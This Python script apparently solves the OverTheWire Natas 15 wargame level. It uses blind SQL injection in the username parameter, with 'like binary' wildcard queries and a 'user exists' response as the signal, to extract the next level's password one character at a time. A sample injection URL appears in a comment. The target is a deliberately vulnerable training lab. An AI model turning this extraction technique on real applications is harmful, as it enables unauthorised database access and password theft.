#!/usr/bin/env python3

import requests
import string
#http://natas15.natas.labs.overthewire.org/index.php?username=natas16"%20and%20password%20like%20"w%&debug
guess = ["a"]
pw = open("pw").read()[:-1] # cut off \n
# passwords are 32 digits long (verified with ?username=natas16" and length(password) = "32)
for i in range(33):
    # cut off first char of ascii_letters because we start with a
    for letter in string.ascii_letters[1:] + string.digits:
        # like binary makes it case sensitive
        inj = 'natas16" and password like binary "{}%'.format("".join(guess))
        url = "http://natas15.natas.labs.overthewire.org/index.php?username={}&debug".format(inj)
        print("reqing", url)
        r = requests.get(url, auth=("natas15", pw))
        print(r.text)
        if "This user exists." in r.text:
            print("got", letter, "guess:", guess)
            guess += "a"
            break
        else:
            print("not", guess)
            guess[-1] = letter
print("".join(guess))
